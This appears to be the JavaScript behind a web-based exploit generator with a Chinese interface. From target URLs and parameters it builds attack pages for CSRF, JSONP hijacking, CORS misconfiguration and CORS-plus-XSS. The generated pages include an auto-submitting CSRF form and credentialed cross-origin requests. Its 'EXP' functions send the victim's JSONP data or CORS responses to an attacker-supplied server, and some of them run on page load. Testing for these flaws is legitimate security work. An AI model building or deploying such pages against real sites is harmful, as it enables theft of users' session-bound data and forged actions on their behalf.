window.onload = function (){
	openPage('./poc_cn/html/csrf.html')
	var ddEle = document.getElementById('select1')
	ddEle.style.background = '#009688'
}


function HTTPRequest(doc,urladdress,isHTML){
	$.ajax({
		type: "GET",
		dataType: "html",
		url: urladdress,
		success: function (result) {
			changePage(doc,result,isHTML);
		},
		error: function() {
			alert("Error!");
		}
	});
}

function openPage(laddress){
	var ddEle = document.getElementById('select1')
	var pocTest = $("#pocTest");
	if (laddress == './poc_cn/html/csrf.html') {
		ddEle.style.background = '#009688'
	}else{
		ddEle.style.background = 'rgba(0, 0, 0, 0)'
	}
	// if(laddress == './poc_cn/html/googlehack.html'){
	// 	show2.className = 'layui-this'
	// }else if(laddress == './poc_cn/html/googlehack1.html'){
	// 	show1.className = 'layui-this'
	// }
	//alert(pocTest)
	HTTPRequest(pocTest,laddress,1);
}

function changePage(doc,htmlContent,isHTML){
	if(isHTML){
		doc.html(htmlContent);
	}else{
		doc.text(htmlContent);
	}
}

function getEle(id){
	return document.getElementById(id)
}

function funDownload(){
	var eleLink = document.createElement('a');
    eleLink.download = document.getElementById('title').innerText + '.html'
    eleLink.style.display = 'none';
    // 字符内容转变成blob地址
    var content = document.getElementById('pocText').value
    var blob = new Blob([content]);
    eleLink.href = URL.createObjectURL(blob);
    // 触发点击
    document.body.appendChild(eleLink);
    eleLink.click();
    // 然后移除
    document.body.removeChild(eleLink);
};    

// function getOnclick(par){
// 	if(par == "googlehack1"){
// 		window.location.href = "./poc_cn/html/googlehack.html"
// 	}
// 	if(par == "googlehack2"){
// 		window.location.href = "./poc_cn/html/googlehack1.html"
// 	}
// }


function getPoC(par){
	var input = $("#input").val()
	var pocTextEle = document.getElementById('pocText')
	if(par == "jsonp"){
		var cValue = $("#cvalue").val();
		pocTextEle.value = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="utf-8">\n<title>JSONP劫持测试</title>\n</head>\n<body>\n<script>\nfunction '+ cValue + '(data){'+'\n'+'alert(JSON.stringify(data))};\n</script>\n<script src="' + input + '"></script>\n</body>\n</html>'
		}

	else if (par == "jsonp-rf") {
		var cValue = $("#cvalue").val();
		pocTextEle.value = '<!DOCTYPE html>\n<html>\n<head>\n<meta name="referrer" content="no-referrer" />\n<title>JSONP绕过空ReFerer劫持测试</title>\n</head>\n<body>\n<script>\nfunction '+ cValue + '(data){'+'\n'+'alert(JSON.stringify(data))};\n</script>\n<script src="' + input + '"></script>\n</body>\n</html>'
		}

	else if (par == "csrf") {
		var methodArr = document.getElementsByName('method')
		// console.log(methodArr)
		var methodType
		for (var i = 0; i < methodArr.length; i++) {
			if (methodArr[i].checked) {
				methodType = methodArr[i].value
			}
		}
		if (methodType == 'GET') {
			pocTextEle.value = input
		}else if(methodType == 'POST'){
			// console.log(getEle('data'))
			var inputdate = ''
			var dataVal = getEle('data').value
			var dataArr = dataVal.split('&')

			for (var i = 0; i < dataArr.length; i++) {
				// var inputEle = document.createElement('input');
				inputdate +='\n    fields += "' + '<input type="hidden" name="'+ dataArr[i].split('=')[0] + '" value="' + dataArr[i].split('=')[1] + '"/>;"\n'
			}
				pocTextEle.value = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="utf-8">\n<title>CSRF测试</title>\n</head>\n<body>\n    <script type="text/javascript">\n    function post(url,fields)\n    {\n    var p = document.createElement("form");\n    p.action = url;\n    p.innerHTML = fields;\n    p.target = "_self";\n    p.method = "post";\n    document.body.appendChild(p);\n    p.submit();\n    }\n    function csrf_hack()\n    {\n    var fields;\n' + inputdate + '\n    var url = "' + input + '&submit=提交";\n    post(url,fields);\n    }\n    window.onload = function() { csrf_hack();}\n    </script>\n</body>\n</html>'
		}

	}else if (par == "cors") {
		var methodArr = document.getElementsByName('method')
		var methodType
		for (var i = 0; i < methodArr.length; i++) {
			if (methodArr[i].checked) {
				methodType = methodArr[i].value
			}
		}
		if (methodType == 'GET') {
			pocTextEle.value = '<html>\n   <head>\n      <script>\n         function cors() {\n            var xhttp = new XMLHttpRequest();\n                xhttp.onreadystatechange = function() {\n                    if (this.readyState == 4 && this.status == 200) {\n                        document.getElementById("emo").innerHTML = alert(this.responseText);\n            }\n         };\n         xhttp.open("GET", "'+ input +'", true);\n         xhttp.withCredentials = true;\n         xhttp.send();\n         }\n      </script>\n   </head>\n   <body>\n      <center>\n      <h2>CORS PoC Exploit </h2>\n      <h3>created by @VK</a></h3>\n      <div id="demo">\n         <button type="button" onclick="cors()">Exploit</button>\n      </div>\n   </body>\n</html>'
		}else if(methodType == 'POST'){
			var dataVal = getEle('data').value
			// console.log(dataVal)
			pocTextEle.value = '<html>\n   <head>\n      <script>\n         function cors() {\n            var xhttp = new XMLHttpRequest();\n                xhttp.onreadystatechange = function() {\n                    if (this.readyState == 4 && this.status == 200) {\n                        document.getElementById("emo").innerHTML = alert(this.responseText);\n            }\n         };\n\n         var data = "'+ dataVal +'";\n         xhttp.open("POST","'+ input +'",true);\n         xhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded;");\n         xhttp.withCredentials = true;\n         xhttp.send(data);\n         }\n      </script>\n   </head>\n   <body>\n      <center>\n      <h2>CORS PoC Exploit </h2>\n      <h3>created by @VK</a></h3>\n      <div id="demo">\n         <button type="button" onclick="cors()">Exploit</button>\n      </div>\n   </body>\n</html>'
		}

	}else if (par == "cors-xss") {
		var CorsUrl = $("#input1").val();
		var XssUrl = $("#input2").val();
		var parameterValue = $("#parameter").val();
		var XssArr
		xsspayload = '<script>function cors() {var xhttp = new XMLHttpRequest();xhttp.onreadystatechange = function() {if (this.status == 200) {alert(this.responseText);document.getElementById("demo").innerHTML = this.responseText;}};xhttp.open("GET", "'+ CorsUrl +'", true);xhttp.withCredentials = true;xhttp.send();}cors();</script>'
		if (XssUrl.indexOf('?'+ parameterValue + '=') > -1){
			XssArr = XssUrl.split('?'+ parameterValue + '=')
			pocTextEle.value = XssArr[0] + '?'+ parameterValue + '=' + xsspayload + XssArr[1]
		} else if (XssUrl.indexOf('&'+ parameterValue + '=') > -1) {
			XssArr = XssUrl.split('&'+ parameterValue + '=')
			pocTextEle.value = XssArr[0] + '&'+ parameterValue + '=' + xsspayload + XssArr[1]
		} else {
			pocTextEle.value = '参数输入错误，请重新输入！！！'
		}
	}
}





function getExP(par){
	var input = $("#input").val()
	if(par == "jsonp-exp"){
		var cValue = $("#cvalue").val();
		var cvaluevps = $("#cvaluevps").val();
		document.getElementById('pocText').value = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="utf-8">\n<title>JSONP劫持-EXP</title>\n</head>\n<body>\n<script>\nfunction '+ cValue + '(data){'+'\n	'+'alert(JSON.stringify(data));\n	var xmlhttp = new XMLHttpRequest();\n	var url = "' + cvaluevps + '" + JSON.stringify(data);\n	xmlhttp.open("GET",url,true);\n	xmlhttp.send();\n	}\n</script>\n<script src="' + input + '"></script>\n</body>\n</html>'
		}
	if(par == "cors-exp"){
		var cvaluevps = $("#cvaluevps").val();
		var methodArr = document.getElementsByName('method')
		var methodType
		for (var i = 0; i < methodArr.length; i++) {
			if (methodArr[i].checked) {
				methodType = methodArr[i].value
			}
		}
		if (methodType == 'GET') {
			document.getElementById('pocText').value = '<!DOCTYPE html>\n<html>\n<head><title>CORS EXP</title></head>\n<body>\n<script>\n  function cors(){\n    var xhttp = new XMLHttpRequest();\n    xhttp.onreadystatechange = function() {\n      if(this.readyState == 4 && this.status == 200) \n      {\n      document.location="'+ cvaluevps +'?"+escape(this.responseText);\n      }\n    };\n    xhttp.open("GET","'+ input +'",true);\n    xhttp.withCredentials = true;\n    xhttp.send();\n  }\n\nwindow.onload = function (){\n  cors()\n}\n</script>\n</body>\n</html>'
		}else if(methodType == 'POST'){
			var dataVal = getEle('data').value
			document.getElementById('pocText').value ='<!DOCTYPE html>\n<html>\n<head><title>CORS EXP</title></head>\n<body>\n<script>\n  function cors(){\n    var xhttp = new XMLHttpRequest();\n    xhttp.onreadystatechange = function() {\n      if(this.readyState == 4 && this.status == 200) \n      {\n      document.location="'+ cvaluevps +'?"+escape(this.responseText);\n      }\n    };\n    \n    var dataValue = "'+ dataVal +'";\n    xhttp.open("POST","'+ input +'",true);\n    xhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded;");\n    xhttp.withCredentials = true;\n    xhttp.send(dataValue);\n  }\n\nwindow.onload = function (){\n  cors()\n}\n</script>\n</body>\n</html>'

		}
	}
}

